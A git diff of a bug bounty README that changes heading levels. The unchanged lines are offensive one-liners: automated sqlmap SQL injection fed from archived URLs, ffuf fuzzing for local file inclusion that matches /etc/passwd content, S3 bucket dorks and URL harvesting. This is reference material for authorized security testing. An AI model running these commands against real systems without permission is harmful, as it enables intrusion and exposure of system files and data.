@@ -1,14 +1,14 @@
 # Bugbounty
 ## 2024 Oneliners found online
 
-#### Check SQL
+## Check SQL
 waybackurls 'URL TARGET'| grep '='| httpx --silent --status-code| awk '{print $1}'| xargs -I{} sqlmap -u {} -v 3 --random-agent --tamper "between,randomcase,space2comment" --level 5 --risk 3 --batch --threads 5 --crawl 2 --suffix=') and 1=1-- -'
 
-#### Screenshot
+## Screenshot
 cat hosts | gowitness scan file -f - --write-csv  
 
 
-## 2025 Oneliners found online 
+# 2025 Oneliners found online 
 
 ## LFI
 findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
@@ -56,7 +56,7 @@ https://chromewebstore.google.com/detail/s3bucketlist/anngjobjhcbancaaogmlcffohp
 
 (site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"
 
-### Get urls
+## Get urls
 
 waymore -i hackerone.com -mode U -oU hackerone_urls.txt
 
